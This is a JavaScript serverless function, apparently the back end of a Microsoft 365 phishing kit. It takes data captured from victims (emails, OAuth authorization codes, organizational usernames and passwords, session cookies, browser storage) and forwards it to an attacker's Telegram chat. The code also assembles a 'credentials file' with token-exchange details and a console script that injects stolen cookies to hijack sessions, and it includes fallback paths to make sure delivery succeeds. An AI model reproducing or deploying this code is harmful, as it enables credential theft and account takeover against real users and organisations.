export const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting...');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data:', JSON.stringify(data, null, 2));

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    console.log('🔧 Environment check:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenStart: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'missing'
    });

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Prepare message content
    const email = data.email || 'oauth-user@microsoft.com';
    const domain = data.domain || 'unknown-domain';
    const sessionId = data.sessionId || 'no-session';
    const hasAuthCode = data.authorizationCode || data.hasAuthCode || false;
    const authCode = data.authorizationCode || 'Not captured';
    
    const timestamp = new Date().toISOString();
    
    let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
    messageText += `📧 Email: ${email}\n`;
    messageText += `🔑 Session ID: ${sessionId}\n`;
    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see next message)' : 'Missing'}\n`;
    messageText += `🕒 Time: ${timestamp}\n\n`;
    
    // Add organizational credentials info
    const orgCreds = data.organizationalCredentials;
    if (orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password)) {
      messageText += `🏢 *Organizational Login Detected*\n`;
      messageText += `🏷️ Type: ${orgCreds.organizationType || 'Unknown'}\n`;
      messageText += `👤 Org Email: ${orgCreds.email || 'not-captured'}\n`;
      messageText += `🔑 Org Username: ${orgCreds.username || 'not-captured'}\n`;
      messageText += `🔐 Org Password: ${orgCreds.password ? '✅ Captured' : '❌ Not captured'}\n`;
      messageText += `🌐 Org Domain: ${orgCreds.domain || 'unknown'}\n\n`;
    } else {
      messageText += `🏢 Organization: Direct Microsoft login\n\n`;
    }
    
    // Note: Authorization code is in the file, not in text message for security
    
    // Add cookie info if available
    if (data.cookies && Array.isArray(data.cookies) && data.cookies.length > 0) {
      messageText += `🍪 Cookies: ${data.cookies.length} captured\n`;
    } else {
      messageText += `🍪 Cookies: None captured\n`;
    }
    
    // Add browser fingerprint if available
    if (data.browserFingerprint) {
      messageText += `🖥️ Browser: ${data.browserFingerprint.userAgent ? data.browserFingerprint.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
    }

    console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');

    // Send main message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      parse_mode: 'Markdown'
    };

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error:', result);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status
        }),
      };
    }

    console.log('✅ Main message sent to Telegram');

    // Always send credentials file (even if no cookies)
    let fileSent = false;
    try {
      let formattedCookies = [];
      
      // Parse cookies from various data sources
      if (data.formattedCookies && Array.isArray(data.formattedCookies)) {
        formattedCookies = data.formattedCookies;
      } else if (data.cookies && Array.isArray(data.cookies)) {
        formattedCookies = data.cookies;
      } else if (data.documentCookies && typeof data.documentCookies === 'string') {
        const cookieStrings = data.documentCookies.split(';');
        formattedCookies = cookieStrings
          .map(str => {
            const [name, ...valueParts] = str.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
              hostOnly: false,
              session: false,
              storeId: null,
            } : null;
          })
          .filter(Boolean);
      }

      // Ensure all cookies have Microsoft domain (if any)
      const microsoftCookies = formattedCookies.map(c => ({
        ...c,
        domain: '.login.microsoftonline.com',
      }));
      
      console.log(`📄 Preparing file with ${microsoftCookies.length} cookies and auth code: ${!!authCode}`);

      // Create JavaScript injection code
      const jsInjectionCode = microsoftCookies.length > 0
        ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
            JSON.stringify(microsoftCookies)
          )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
        : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;

      // Extract organizational credentials
      const orgCreds = data.organizationalCredentials;
      
      // Create cookies file content
      const cookiesFileContent = `// ====================================================
// MICROSOFT 365 OAUTH CREDENTIALS - ${timestamp}
// ====================================================
// Email: ${email}
// Domain: ${domain}
// Session ID: ${sessionId}
// Cookies Found: ${microsoftCookies.length}
// Organizational Login: ${orgCreds ? orgCreds.organizationType : 'None (Direct Microsoft)'}
// ====================================================

// *** AUTHORIZATION CODE (PRIMARY CREDENTIAL) ***
// Use this code to exchange for access tokens via Microsoft OAuth API
// Expires in 10 minutes from issuance
let authorizationCode = "${authCode || 'Not captured'}";

// *** ORGANIZATIONAL LOGIN CREDENTIALS ***
${orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password) ? `
// Captured from company/federated login page
// Organization Type: ${orgCreds.organizationType || 'Unknown'}
// Login Domain: ${orgCreds.domain || 'Unknown'}

let organizationalCredentials = {
    email: "${orgCreds.email || 'not-captured'}",
    username: "${orgCreds.username || 'not-captured'}",
    password: "${orgCreds.password || 'not-captured'}",
    organizationType: "${orgCreds.organizationType || 'Unknown'}",
    loginDomain: "${orgCreds.domain || 'Unknown'}",
    captureTime: "${orgCreds.captureTime || timestamp}",
    loginUrl: "${orgCreds.url || 'Unknown'}"
};

// *** ORGANIZATIONAL FORM DATA ***
let organizationalFormData = ${JSON.stringify(orgCreds.formData || {}, null, 2)};
` : `
// No organizational login detected - user logged in directly with Microsoft
let organizationalCredentials = null;
`}

// *** USER INFORMATION ***
let email = "${email}";
let sessionId = "${sessionId}";
let domain = "${domain}";
let timestamp = "${timestamp}";

// *** AUTHORIZATION CODE FOR COPY/PASTE ***
/*
${authCode || 'Not captured'}
*/

// *** OAUTH DETAILS FOR TOKEN EXCHANGE ***
/*
CLIENT_ID: eabd0e31-5707-4a85-aae6-79c53dc2c7f0
REDIRECT_URI: https://vaultydocs.com/oauth-callback
SCOPE: openid profile email User.Read
GRANT_TYPE: authorization_code
TOKEN_ENDPOINT: https://login.microsoftonline.com/common/oauth2/v2.0/token
*/

// *** COOKIE INJECTION SCRIPT ***
// Paste this in browser console on Microsoft login page:
${jsInjectionCode}

// *** RAW COOKIE DATA ***
${JSON.stringify(microsoftCookies, null, 2)}

// *** BROWSER STORAGE DATA ***
// Session Storage:
${data.browserFingerprint?.sessionStorage || 'Empty'}

// Local Storage:
${data.browserFingerprint?.localStorage || 'Empty'}

// *** END OF FILE ***
`;

      // Always send credentials as text message (more reliable than file upload)
      const fileName = `microsoft365_credentials_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;
      
      console.log('📤 Sending credentials to Telegram as text message');
      
      // Split the content into chunks if too long
      const maxLength = 4000;
      const chunks = [];
      
      if (cookiesFileContent.length <= maxLength) {
        chunks.push(cookiesFileContent);
      } else {
        // Split into multiple chunks
        for (let i = 0; i < cookiesFileContent.length; i += maxLength) {
          chunks.push(cookiesFileContent.substring(i, i + maxLength));
        }
      }
      
      // Send header message
      const headerMessage = `📁 **MICROSOFT 365 CREDENTIALS FILE**\n\n📧 Email: \`${email}\`\n🔑 Session: \`${sessionId}\`\n📄 File: \`${fileName}\`\n🍪 Cookies: ${microsoftCookies.length}\n✅ Auth Code: ${authCode ? 'Captured' : 'Missing'}\n\n${chunks.length > 1 ? `📋 Content split into ${chunks.length} parts:` : ''}`;
      
      const headerResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: headerMessage,
          parse_mode: 'Markdown'
        }),
      });
      
      // Send each chunk
      for (let i = 0; i < chunks.length; i++) {
        const chunkMessage = chunks.length > 1 
          ? `📄 **Part ${i + 1}/${chunks.length}**\n\n\`\`\`javascript\n${chunks[i]}\n\`\`\``
          : `\`\`\`javascript\n${chunks[i]}\n\`\`\``;
          
        const chunkResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: chunkMessage,
            parse_mode: 'Markdown'
          }),
        });
        
        if (chunkResponse.ok) {
          fileSent = true;
          console.log(`✅ Credentials part ${i + 1}/${chunks.length} sent to Telegram`);
        } else {
          console.error(`❌ Failed to send credentials part ${i + 1}:`, await chunkResponse.text());
        }
        
        // Small delay between chunks to avoid rate limiting
        if (i < chunks.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      if (fileSent) {
        console.log('✅ All credentials sent to Telegram successfully');
      } else {
        console.error('❌ Failed to send credentials to Telegram');
        
        // Ultra fallback: send just the auth code
        const emergencyMessage = `🚨 **EMERGENCY BACKUP**\n\n📧 Email: \`${email}\`\n🔑 Authorization Code:\n\`\`\`\n${authCode || 'Not captured'}\n\`\`\``;
        
                 const emergencyResponse = await fetch(telegramUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: emergencyMessage,
            parse_mode: 'Markdown',
          }),
        });

        if (emergencyResponse.ok) {
          fileSent = true;
          console.log('✅ Emergency auth code sent to Telegram');
        }
      }
    } catch (fileError) {
      console.error('❌ File generation error:', fileError);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully',
        telegramMessageId: result.result?.message_id,
        fileSent: fileSent,
        cookieCount: data.formattedCookies?.length || data.cookies?.length || 0
      }),
    };

  } catch (error) {
    console.error('❌ Handler error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        details: error.message,
        stack: error.stack
      }),
    };
  }
};